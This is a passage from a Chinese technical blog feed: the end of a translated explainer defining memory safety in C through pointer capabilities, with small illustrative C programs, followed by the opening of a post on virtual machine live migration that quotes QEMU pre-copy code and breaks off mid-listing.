pf-&amp;gt;x*/&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这里，缓冲区溢出发生在 &lt;em&gt;object&lt;/em&gt; 的内部。我们仍然可以类似的在域间引入无限间距的概念来排除缓存溢出的错误。这并未太背离现实，C标准允许编译器决定不同域的间距。另一方面，程序语言把结构体当做一个单独的&lt;em&gt;object&lt;/em&gt; (从 &lt;em&gt;malloc&lt;/em&gt; 返回的单独指针). 许多程序会把一个结构体映射到另一个结构体，或者会确定好一种间距方案。许多编译器都支持这些操作，但是否可以有一种更好的定义不依赖于这些？&lt;/p&gt;
&lt;h3 id=&quot;Pointers-as-capabilities&quot;&gt;&lt;a href=&quot;#Pointers-as-capabilities&quot; class=&quot;headerlink&quot; title=&quot;Pointers as capabilities&quot;&gt;&lt;/a&gt;Pointers as capabilities&lt;/h3&gt;&lt;p&gt;从 &lt;em&gt;Definition 2&lt;/em&gt; 中，了解到许多概念，比如，定义的（分配的），未定义的（从没有分配的或者分配后回收的),我们假设分配后回收的内存不会再复用。如此一来，只要访问未定义的内存，就会违背内存安全性。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Definition 3:&lt;/em&gt;&lt;/strong&gt; 我们引入这么一个概念, Pointers as capabilities. 也就是说，允许指针的持有者访问一定区域中的内存。一个指针由三个元素组成&lt;em&gt;（p,b,e)&lt;/em&gt;: &lt;em&gt;b&lt;/em&gt; 定义有效的区域，&lt;em&gt;e&lt;/em&gt; 定义边界，&lt;em&gt;p&lt;/em&gt; 代表指针本身。 程序只能操作&lt;em&gt;p&lt;/em&gt;，&lt;em&gt;b&lt;/em&gt; 和&lt;em&gt;e&lt;/em&gt; ,这样做只是为了定义一次执行是否是内存安全的。&lt;/p&gt;
&lt;p&gt;举个例子，看下面的&lt;em&gt;Program 3&lt;/em&gt;以及对应的内存效果图：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;/* Program 3 */&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;struct foo &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  int x;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  int y;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  char *pc;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;struct foo *pf = malloc(...);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;pf-&amp;gt;x = 5;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;pf-&amp;gt;y = 256;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;pf-&amp;gt;pc = &amp;quot;before&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;pf-&amp;gt;pc += 3;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;int *px = &amp;amp;pf-&amp;gt;x;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&quot;http://7xppf1.com1.z0.glb.clouddn.com/memory-safety3.jpg&quot; alt=&quot;memory-safety3&quot;&gt;&lt;/p&gt;
&lt;p&gt;重点关注代码的最后两行。&lt;em&gt;Program 3&lt;/em&gt; 允许指针运算来新建一个新的指针，但只能当新指针落在b到e之间才能被解引用。从代码中看到，增加 &lt;em&gt;\&lt;/em&gt;pc&lt;em&gt;的&lt;/em&gt;p&lt;em&gt; ,新指针仍然落在&lt;/em&gt;b&lt;em&gt; 和&lt;/em&gt;e&lt;em&gt; 之间，所以执行&lt;/em&gt;*(pf-&amp;gt;pc)&lt;em&gt; 是合法有效的。但如果执行 &lt;/em&gt;pf-&amp;gt;pc+=10&lt;em&gt; , &lt;/em&gt;*(pf-&amp;gt;pc)&lt;em&gt; 将会违背内存安全性，尽管&lt;/em&gt;pf-&amp;gt;pc&lt;em&gt; 有可能碰巧就落在定义的内存区域中（这块内存区域可能分配给了其它&lt;/em&gt;object*).&lt;/p&gt;
&lt;p&gt;最后一行代码创建一个新的指针&lt;em&gt;px&lt;/em&gt; 指向&lt;em&gt;pf&lt;/em&gt; 指针的第一个域，将边界缩小到其中的一个域中。这就排除了 &lt;em&gt;Program 2&lt;/em&gt; 带来的内存溢出问题。加入我们保留&lt;em&gt;pf&lt;/em&gt;整个的边界，此程序可能会利用&lt;em&gt;px&lt;/em&gt;溢出到结构体中的其它域中。&lt;/p&gt;
&lt;p&gt;Capability是无法伪造的，就像我们并不能伪造一个指针映射到整形数据中。非法映射可以是直接的（&lt;em&gt;e.g. p=(int \&lt;/em&gt;)5&lt;em&gt; ） 也可以是间接的，比如将含有整形数据的结构体映射到含有指针的结构体中（&lt;/em&gt;e.g. p=(int **)pf&lt;em&gt; ), 将&lt;/em&gt;Program 3&lt;em&gt; 中结构体中的第一个整形数据域映射成指针。我们的定义简单的将映射看作是空操作。只有有效的指针才能被解引用，一个指针的capabilities在它创建的时候就已经确定了。 我们的定义中允许 &lt;/em&gt;Program 4* 的执行：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;/* Program 4 */&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;int x;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;int *p = &amp;amp;x;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;int y = (int)p;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;int *q = (int *)y&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;*q = 5;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;em&gt;p&lt;/em&gt; 指针初始化得&lt;em&gt;b&lt;/em&gt; 和&lt;em&gt;e&lt;/em&gt; 一直会保持不变，尽管之后&lt;em&gt;p&lt;/em&gt; 被转化成整形y, 因此当&lt;em&gt;y&lt;/em&gt; 被转回为&lt;em&gt;q&lt;/em&gt; 并被解引用的时候，指针依然存在。从另一方面来看，如果在&lt;em&gt;Program 3&lt;/em&gt; 的最后加上 &lt;em&gt;p=(int \&lt;/em&gt;*)pf&lt;em&gt; , 紧接着 &lt;/em&gt;*p=malloc(sizeof(int))&lt;em&gt;， 之后的操作 &lt;/em&gt;**p&lt;em&gt;以及&lt;/em&gt;printf(“%d\n”,pf-&amp;gt;x)* 都是合法的。也就是说，一块内存区域一开始存储了整形数据，之后也可将整形数据修改为指向整形数据的指针，然后解引用指针，这样操作是安全的，但反过来却不行。&lt;/p&gt;
&lt;p&gt;在某种意义上来说，基于capability定义的内存安全性是一种类型安全形式（type safety)。这里只有两种类型：指针类型和非指针类型。这种定义保证了 1) 指针只在定义了合法内存区域的安全模式下被创建. 2) 指针只有在它们是指向分配给它们的内存区域的情况下被解引用. 3) 那块内存区域仍然是定义过的。这种定义排除了上述所有的五种错误。&lt;/p&gt;
&lt;p&gt;注：本文主要意译 PL Enthusiast 上的一篇文章： &lt;a href=&quot;http://www.pl-enthusiast.net/2014/07/21/memory-safety/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;What is memory safety&lt;/a&gt; &lt;/p&gt;
&lt;h3 id=&quot;References&quot;&gt;&lt;a href=&quot;#References&quot; class=&quot;headerlink&quot; title=&quot;References&quot;&gt;&lt;/a&gt;References&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;http://www.pl-enthusiast.net/2014/07/21/memory-safety/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;What is memory safety&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://nebelwelt.net/publications/files/13Oakland.pdf&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;S&amp;amp;P’13 Eternal War in Memory &lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&quot;Acknowledgement&quot;&gt;&lt;a href=&quot;#Acknowledgement&quot; class=&quot;headerlink&quot; title=&quot;Acknowledgement&quot;&gt;&lt;/a&gt;Acknowledgement&lt;/h2&gt;&lt;p&gt;作者[新浪微博：&lt;a href=&quot;http://weibo.com/2767520802/profile?rightmod=1&amp;amp;wvr=6&amp;amp;mod=personinfo&amp;amp;is_all=1&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;@diting0x&lt;/a&gt;]&lt;/p&gt;
&lt;p&gt;本文遵守Attribution-NonCommercial-NoDerivatives 4.0 International License (CC BY-NC-ND 4.0)&lt;/p&gt;
&lt;p&gt;转载本文请注明出处以及&lt;a href=&quot;http://www.pl-enthusiast.net/2014/07/21/memory-safety/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;What is memory safety&lt;/a&gt; 出处&lt;br&gt;原文地址: &lt;a href=&quot;http://www.chongh.wiki/blog/2016/02/17/memory-safety/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.chongh.wiki/blog/2016/02/17/memory-safety/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;另，感谢&lt;a href=&quot;https://nebelwelt.net/publications/files/13Oakland.pdf&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;S&amp;amp;P’13 Eternal War in Memory &lt;/a&gt;的作者 &lt;a href=&quot;https://nebelwelt.net&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Mathis Payer教授&lt;/a&gt; 的某些答疑，感谢好友 &lt;a href=&quot;http://www.yebangyu.org/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;叶邦宇&lt;/a&gt; 指出的一些勘误。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;C语言中的buffer overflows, format string attacks等其它的一些vulnerabilities都有一个共同的问题：违背内存安全(Memory Safety)。本文主要讲述如何准确定义内存安全，为什么这些vulnerabilities违背了内存安全。也为后续两篇文章&lt;a href=&quot;http://www.chongh.wiki/blog/2016/02/18/memorywar-attack/&quot;&gt;内存持久战-攻击模型&lt;/a&gt;，&lt;a href=&quot;http://www.chongh.wiki/blog/2016/02/23/memorywar-defense/&quot;&gt;内存持久战-防御机制&lt;/a&gt;做好铺垫。&lt;/p&gt;
&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;IEEE Security&amp;amp;Privacy’13&lt;/li&gt;
&lt;li&gt;不访问未定义的内存&lt;/li&gt;
&lt;li&gt;无限间距&lt;/li&gt;
&lt;li&gt;Pointers as capabilities&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="security" scheme="http://yoursite.com/categories/security/"/>
    
    
      <category term="Security" scheme="http://yoursite.com/tags/Security/"/>
    
      <category term="Memory" scheme="http://yoursite.com/tags/Memory/"/>
    
      <category term="System" scheme="http://yoursite.com/tags/System/"/>
    
      <category term="Attack" scheme="http://yoursite.com/tags/Attack/"/>
    
  </entry>
  
  <entry>
    <title>云平台高可用之虚拟机迁移</title>
    <link href="http://yoursite.com/blog/2016/01/02/highavailability-migration/"/>
    <id>http://yoursite.com/blog/2016/01/02/highavailability-migration/</id>
    <published>2016-01-03T04:02:39.000Z</published>
    <updated>2016-04-21T20:52:09.000Z</updated>
    
    <content type="html">&lt;p&gt;无序，直接看文章。&lt;/p&gt;
&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;什么是云平台高可用&lt;/li&gt;
&lt;li&gt;虚拟机迁移主要算法&lt;/li&gt;
&lt;li&gt;实现 Pre-copy&lt;/li&gt;
&lt;li&gt;思考&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;什么是云平台高可用&quot;&gt;&lt;a href=&quot;#什么是云平台高可用&quot; class=&quot;headerlink&quot; title=&quot;什么是云平台高可用&quot;&gt;&lt;/a&gt;什么是云平台高可用&lt;/h2&gt;&lt;p&gt;云，一个再熟悉不过的词了。大家都看到了云计算的商业价值，于是乎各大IT公司都纷纷提出自己的云计算服务，有Amozon的EC2，微软的Azure,谷歌的Google AppEngine,腾讯云，百度云，阿里云等。说到Google AppEngine，相信许多用goagent翻墙党都用过这个东西，但估计大家都只忙着使用goagent，却忽略了AppEngine其中提供的云服务。如今，云无处不在，从当今主流产品看，云平台需要满足以下几个需求：&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;第一，满足多用户的大规模并发访问，想想2015年的双十一，官方数据表明Taobao每秒钟要处理14万订单交易，平均每天也有七八千万访客（具体数据待我问阿里朋友）&lt;/li&gt;
&lt;li&gt;第二，处理海量数据，14年，google平均每天要处理57.4亿次查询，处理的数据高达100PB；阿里云的大数据产品ODPS在6个小时内就能处理100PB的数据&lt;/li&gt;
&lt;li&gt;第三，提供可持续的服务，如今云平台的用户如此之大，分秒级的停机时间将影响数百万用户，导致数十万美元损失，不管从用户角度还是公司本身角度来看，停机时间过长都是不可容忍的&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;针对需求一和需求二，当前云平台的解决方案大多是通过分布式协议及系统来组织管理大量的廉价设备，以提供良好的可扩展性，从而满足大量用户的高并发访问需求以及对海量数据的处理能力，这不在本文考虑范围之内，不多叙说。本文只针对第三个需求，提供可持续的服务，也就是云计算平台中常说的高可用性（high availability)。可用性的准确定义是，在需要的外部资源得到保证的前提下，系统在规定的条件和时间内处于可执行功能状态的能力，高可用则定义为用来保障系统可用性达到某一预定水平的系统设计和技术手段。目前，许多云服务提供商都声称自己的云平台能保证较高的可用性，但实际上，近年来云平台的失效事件频繁发生。具体事件，可搜索了解一下。&lt;/p&gt;
&lt;p&gt;虚拟化技术是云计算平台的核心支撑技术，虚拟机的强隔离性有效解决了资源的共享使用问题，大大支撑了云计算平台的资源聚合、负载均衡、节能、可扩展等特性。为保证云平台的高可用性，基于虚拟机备份思想的技术应运而生，也是当前云平台为保证高可用性的最主要途径。虚拟机备份思想，主要包括三个方面：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;第一，快照回滚（snapshot&amp;amp;rollback)，将虚拟机备份状态保存在持久化存储系统中, 在虚拟机因上层软件或底层硬件故障失效后,可以加载备份状态并恢复到之前的运行 状态继续运行&lt;/li&gt;
&lt;li&gt;第二，热备技术（hot-standby)，将虚拟机执行状态实时传输到目的端计算节点,在检测到源计算节点失效后,目的端的虚拟机状态可立刻恢复并持续提供任务&lt;/li&gt;
&lt;li&gt;第三，虚拟机迁移（migration)，将虚拟机运行时状态从一台计算节点传输到另一台计算节点,保证虚拟机在源计算节点因失效或维护而停机时可以在目的端继续执行&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;本文旨在讲解虚拟机迁移技术&lt;/p&gt;
&lt;h2 id=&quot;虚拟机迁移主要算法&quot;&gt;&lt;a href=&quot;#虚拟机迁移主要算法&quot; class=&quot;headerlink&quot; title=&quot;虚拟机迁移主要算法&quot;&gt;&lt;/a&gt;虚拟机迁移主要算法&lt;/h2&gt;&lt;p&gt;目前运用最广泛最原始的算法是预拷贝（pre-copy)算法和后拷贝（post-copy)算法，Pre-copy算法也被集成在主流虚拟机平台中如Xen,KVM,VMWare的官方源码中, Post-copy虽还没被各主流虚拟机平台集成，但个人实现起来也不是什么难事。 下面主要介绍这两种算法：&lt;/p&gt;
&lt;p&gt;Pre-copy, 先引用顶会 &lt;a href=&quot;https://www.usenix.org/legacy/event/nsdi05/tech/full_papers/clark/clark.pdf&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;NSDI’05 Live Migration of Virtual Machines&lt;/a&gt; 论文中的一张图，描述了pre-copy算法的时间线&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xppf1.com1.z0.glb.clouddn.com/precopy-step.png&quot; alt=&quot;pre-copy steps&quot;&gt;&lt;br&gt;简而言之，大致思想就是先迭代的迁移整个内存的所有页面，迭代过程中，如果页面有更新，则再迁移更新过的页面，直到满足一个条件让迭代过程收敛（这个条件可以自己根据不同情况合理设置），最后再迁移剩余的页面、cpu、寄存器等状态以及外部设备。&lt;br&gt;贴一个基于Qemu/kvm 1.1.2的pre-copy算法主要代码：&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;86&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;ram_save_live&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(QEMUFile *f, &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; stage, &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; *opaque)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;ram_addr_t&lt;/span&gt; addr;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;uint64_t&lt;/span&gt; bytes_transferred_last;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;double&lt;/span&gt; bwidth = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;uint64_t&lt;/span&gt; expected_time = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; ret;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (stage &amp;lt; &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        memory_global_dirty_log_stop();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        return &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    memory_global_sync_dirty_bitmap(get_system_memory());&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (stage == &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        RAMBlock *block;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        bytes_transferred = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        last_block = &lt;span class=&quot;literal&quot;&gt;NULL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        last_offset = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        sort_ram_list();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;comment&quot;&gt;/* Make sure all dirty bits are set */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        QLIST_FOREACH(block, &amp;amp;ram_list.blocks, next) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; (addr = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;; addr &amp;lt; block-&amp;gt;length; addr += TARGET_PAGE_SIZE) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (!memory_region_get_dirty(block-&amp;gt;mr, addr, 